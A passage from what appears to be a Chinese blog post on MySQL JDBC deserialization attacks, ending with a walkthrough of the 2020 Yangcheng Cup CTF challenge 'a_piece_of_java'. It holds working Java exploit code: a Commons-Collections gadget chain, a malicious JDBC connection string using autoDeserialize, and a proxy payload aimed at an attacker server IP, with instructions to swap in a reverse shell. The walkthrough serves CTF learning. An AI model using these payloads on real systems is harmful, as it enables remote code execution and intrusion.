map.put(&quot;value&quot;,&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);</span><br><span class="line">        try &#123;</span><br><span class="line">            Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            Object o = constructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">            Serialize(o);</span><br><span class="line">            Unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">        &#125; catch (ClassNotFoundException | NoSuchMethodException | IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException&#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = objectInputStream.readObject();</span><br><span class="line">        return obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同理，如果mysql服务中有其他的链子也可以调用其他的链子，比如cc2，cc3，shiro都可以。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742649227083-42d74a80-b9cb-4e84-a290-bce83584341d.png"></p>
+<p>可以看到连接，并且成功弹出计算器。</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h3 id="羊城杯-2020-a-piece-of-java"><a href="#羊城杯-2020-a-piece-of-java" class="headerlink" title="[羊城杯 2020]a_piece_of_java"></a>[羊城杯 2020]a_piece_of_java</h3><p>首先查看<code>controller</code>找到目标可以反序列化的路由，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(value=&#123;&quot;/hello&quot;&#125;)</span><br><span class="line">public String hello(@CookieValue(value=&quot;data&quot;, required=false) String cookieData, Model model) &#123;</span><br><span class="line">    if (cookieData == null || cookieData.equals(&quot;&quot;)) &#123;</span><br><span class="line">        return &quot;redirect:/index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    Info info = (Info)this.deserialize(cookieData);</span><br><span class="line">    if (info != null) &#123;</span><br><span class="line">        model.addAttribute(&quot;info&quot;, (Object)info.getAllInfo());</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;hello&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用的是<code>deserialize</code>在函数下面有写，是一个反序列化的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">private Object deserialize(String base64data) &#123;</span><br><span class="line">    Object obj;</span><br><span class="line">    ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data));</span><br><span class="line">    try &#123;</span><br><span class="line">        SerialKiller ois = new SerialKiller((InputStream)bais, &quot;serialkiller.conf&quot;);</span><br><span class="line">        obj = ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    return obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先看一下<code>serialkiller.conf</code>这个是什么东西。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742731623993-40b31ac7-0a75-4140-916a-b18364162e23.png"></p>
+<p>好像是一个过滤，还是白名单的， 这些正则表达式的作用是允许（即通过白名单）特定的命名空间或类名，例如以 <code>gdufs.</code> 和 <code>java.lang.</code> 开头的类或模块可以被接受，而不受限制。</p>
+<p>因为lib里面有<code>commons-collections-3.2.1.jar</code>，所以可以使用cc5或者cc7来进行反序列化执行命令。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742731928703-67f8c802-83e2-470f-8db5-f422264d153f.png"></p>
+<p>然后进入<code>DatabaseInfo</code>类，可以看到url是由各个参数拼接起来的，没有啥过滤，直接先测试一下能不能弹。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742731918601-b8529f91-ed60-44a4-bff7-22ae5003f50d.png"></p>
+<p>因为在<code>checkAllInfo</code>中使用了<code>connect</code>方法，所以测试中就直接调用<code>checkAllInfo</code>方法了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package gdufs.challenge.web;</span><br><span class="line"></span><br><span class="line">import gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"></span><br><span class="line">public class cat &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        DatabaseInfo databaseInfo = new DatabaseInfo();</span><br><span class="line">        databaseInfo.setHost(&quot;127.0.0.1&quot;);</span><br><span class="line">        databaseInfo.setPort(&quot;3307&quot;);</span><br><span class="line">        databaseInfo.setUsername(&quot;demo&quot;);</span><br><span class="line">        databaseInfo.setPassword(&quot;demo&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;);</span><br><span class="line"></span><br><span class="line">        databaseInfo.checkAllInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>python服务使用之前的代码，然后直接更改ser.bin为cc5的就可以了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742732265829-b2fae18d-9fa4-4c2d-a44c-f39b2ca607fa.png"></p>
+<p>成功弹出计算器。</p>
+<p>然后需要去寻找可以在反序列化时可以调用<code>checkAllInfo</code>的方法了。</p>
+<p>只有一个实现方法，就在<code>InfoInvocationHandler</code>的invoke方法中， 这是一个动态代理的实现类，当代理的实例对象在执行任何方法时都会触发invoke方法。而在hello路由中，被反序列化的数据出来之后会触发<code>getAllInfo()</code>方法，并且题目有Info接口，从而实现动态代理。</p>
+<p>所以只需要把<code>databaseinfo</code>传给<code>InfoInvocationHandler</code>进行动态代理即可触发jdbc。再进行反序列化和base64处理输出即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package gdufs.challenge.web;</span><br><span class="line"></span><br><span class="line">import gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line">import gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line">import gdufs.challenge.web.model.Info;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class cat &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        DatabaseInfo databaseInfo = new DatabaseInfo();</span><br><span class="line">        databaseInfo.setHost(&quot;120.76.143.184&quot;); //服务器的ip</span><br><span class="line">        databaseInfo.setPort(&quot;3307&quot;);</span><br><span class="line">        databaseInfo.setUsername(&quot;demo&quot;);</span><br><span class="line">        databaseInfo.setPassword(&quot;demo&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;);</span><br><span class="line"></span><br><span class="line">        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);</span><br><span class="line">        Info proxinfo = (Info) Proxy.newProxyInstance(Info.class.getClassLoader(), new Class[] &#123;Info.class&#125;, infoInvocationHandler);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(proxinfo);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        String str=new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        System.out.println(str);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>记得改cc5的执行为反弹shell</p>
+<p>先去index路由传一个<code>username</code>和<code>password</code>，这样就不需要自己来构造Cookie的格式了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742729879394-f2715915-5b4c-44e1-9d61-b519639dd2d1.png"></p>
+<p>然后输入序列化数据即可成功反弹shell</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                mysql JDBC学习
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/03/22/mysql JDBC/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">follycat</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2025-03-22 13:24</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/03/25/Jimureport1.7.8%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-44893)/"
+                                   title="Jimureport1.7.8越权漏洞代码分析及修复代码分析(CVE-2024-44893)"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Jimureport1.7.8越权漏洞代码分析及修复代码分析(CVE-2024-44893)</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/03/19/CommonsBeanUtils1/"
+                                   title="CommonsBeanUtils1"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">CommonsBeanUtils1</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="configuration-items-error-tip border-box">
+    <i class="fa-solid fa-circle-exclamation"></i>
+    Please fill in the required configuration items for Valine comment plugin
+</div>
+
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJDBC"><span class="nav-text">什么是JDBC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-a-piece-of-java"><span class="nav-text">[羊城杯 2020]a_piece_of_java</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">follycat</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJDBC"><span class="nav-text">什么是JDBC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-a-piece-of-java"><span class="nav-text">[羊城杯 2020]a_piece_of_java</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
